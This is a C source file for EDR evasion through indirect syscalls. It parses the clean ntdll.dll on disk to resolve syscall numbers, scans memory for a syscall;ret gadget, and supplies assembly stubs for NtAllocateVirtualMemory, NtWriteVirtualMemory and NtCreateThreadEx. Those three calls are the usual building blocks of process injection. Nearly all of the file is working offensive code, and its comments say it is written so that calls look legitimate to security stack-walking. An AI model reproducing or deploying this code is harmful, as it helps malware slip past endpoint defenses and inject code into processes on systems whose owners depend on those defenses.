/*
 * Indirect Syscalls — bypass EDR usermode hooks on ntdll.dll
 *
 * Reads syscall numbers from the clean ntdll.dll on disk (not the
 * potentially-hooked in-memory copy), then executes syscalls via
 * a small assembly stub that jumps into ntdll's own syscall;ret
 * gadget, making the return address look legitimate.
 *
 * Covers: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
 *
 * Compile: x86_64-w64-mingw32-gcc -c indirect_syscall.c -o indirect_syscall.o
 */

#include <windows.h>
#include <winternl.h>

/* Syscall numbers resolved at runtime from disk ntdll */
static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;

/* Address of a syscall;ret gadget inside ntdll .text */
static void *syscall_ret_gadget = NULL;

typedef struct {
    WORD  e_magic;
    WORD  pad[29];
    LONG  e_lfanew;
} MINI_DOS;

typedef struct {
    DWORD Signature;
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} MINI_FILE_HEADER;

static DWORD rva_to_offset(BYTE *base, DWORD rva) {
    MINI_DOS *dos = (MINI_DOS *)base;
    BYTE *nt = base + dos->e_lfanew;
    MINI_FILE_HEADER *fh = (MINI_FILE_HEADER *)nt;
    WORD num_sec = fh->NumberOfSections;
    WORD opt_sz = fh->SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)(nt + 4 + sizeof(MINI_FILE_HEADER) + opt_sz - 4 + 4);
    /* PE sig(4) + file_header(20) + optional_header(opt_sz) */
    sec = (IMAGE_SECTION_HEADER *)(nt + 4 + 20 + opt_sz);
    for (WORD i = 0; i < num_sec; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].SizeOfRawData) {
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
        }
    }
    return 0;
}

/*
 * resolve_ssn_from_disk — read ntdll.dll from System32 on disk,
 * parse its export table, find the target function, and extract
 * the syscall number from the mov eax, <SSN> instruction (4C 8B D1 B8 xx xx 00 00).
 */
static DWORD resolve_ssn_from_disk(const char *func_name) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hFile, NULL);
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hFile); return 0; }

    DWORD rd;
    ReadFile(hFile, buf, sz, &rd, NULL);
    CloseHandle(hFile);

    /* Parse PE export directory */
    MINI_DOS *dos = (MINI_DOS *)buf;
    BYTE *nt = buf + dos->e_lfanew;
    /* Optional header starts at nt + 4 + 20, export dir RVA is at offset 112 (PE64) */
    DWORD *opt64 = (DWORD *)(nt + 4 + 20);
    /* Magic check: PE32+ = 0x020B at offset 0 of optional header */
    WORD magic = *(WORD *)opt64;
    DWORD export_rva = 0;
    if (magic == 0x020B) {
        /* PE64: export directory RVA at optional_header + 112 */
        export_rva = *(DWORD *)((BYTE *)opt64 + 112);
    } else {
        /* PE32: export directory RVA at optional_header + 96 */
        export_rva = *(DWORD *)((BYTE *)opt64 + 96);
    }

    if (export_rva == 0) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }

    DWORD export_off = rva_to_offset(buf, export_rva);
    if (export_off == 0) { VirtualFree(buf, 0, MEM_RELEASE); return 0; }

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(buf + export_off);
    DWORD *names_rva  = (DWORD *)(buf + rva_to_offset(buf, exp->AddressOfNames));
    WORD  *ords       = (WORD  *)(buf + rva_to_offset(buf, exp->AddressOfNameOrdinals));
    DWORD *funcs_rva  = (DWORD *)(buf + rva_to_offset(buf, exp->AddressOfFunctions));

    DWORD ssn = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(buf + rva_to_offset(buf, names_rva[i]));
        if (strcmp(name, func_name) == 0) {
            DWORD func_rva = funcs_rva[ords[i]];
            DWORD func_off = rva_to_offset(buf, func_rva);
            BYTE *code = buf + func_off;
            /*
             * Nt* stub pattern on x64:
             *   4C 8B D1          mov r10, rcx
             *   B8 xx xx 00 00    mov eax, <syscall_number>
             */
            if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 &&
                code[3] == 0xB8) {
                ssn = *(DWORD *)(code + 4);
            }
            break;
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return ssn;
}

/*
 * find_syscall_ret_gadget — scan ntdll .text in memory for
 * the byte sequence 0F 05 C3 (syscall; ret). The indirect call
 * will jump here so the return address is inside ntdll.
 */
static void *find_syscall_ret_gadget(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                /* syscall = 0F 05, ret = C3 */
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                    return (void *)(start + j);
                }
            }
        }
    }
    return NULL;
}

/*
 * init_indirect_syscalls — call once at startup. Resolves SSNs from
 * the clean on-disk ntdll and finds a syscall;ret gadget in memory.
 * Returns TRUE on success.
 */
BOOL init_indirect_syscalls(void) {
    ssn_NtAllocateVirtualMemory = resolve_ssn_from_disk("NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = resolve_ssn_from_disk("NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = resolve_ssn_from_disk("NtCreateThreadEx");

    syscall_ret_gadget = find_syscall_ret_gadget();

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            syscall_ret_gadget != NULL);
}

/*
 * indirect_NtAllocateVirtualMemory — allocate memory via indirect syscall.
 *
 * Uses the resolved SSN and jumps to the syscall;ret gadget inside ntdll
 * so the call stack looks legitimate to EDR stack-walking.
 *
 * x64 calling convention: rcx=arg1, rdx=arg2, r8=arg3, r9=arg4,
 * stack for arg5+. Syscall convention: r10=arg1 (rcx is clobbered).
 */
__attribute__((naked))
NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov %0, %%eax\n\t"
        "jmp *%1\n\t"
        :
        : "m" (ssn_NtAllocateVirtualMemory),
          "m" (syscall_ret_gadget)
    );
}

__attribute__((naked))
NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov %0, %%eax\n\t"
        "jmp *%1\n\t"
        :
        : "m" (ssn_NtWriteVirtualMemory),
          "m" (syscall_ret_gadget)
    );
}

__attribute__((naked))
NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov %0, %%eax\n\t"
        "jmp *%1\n\t"
        :
        : "m" (ssn_NtCreateThreadEx),
          "m" (syscall_ret_gadget)
    );
}
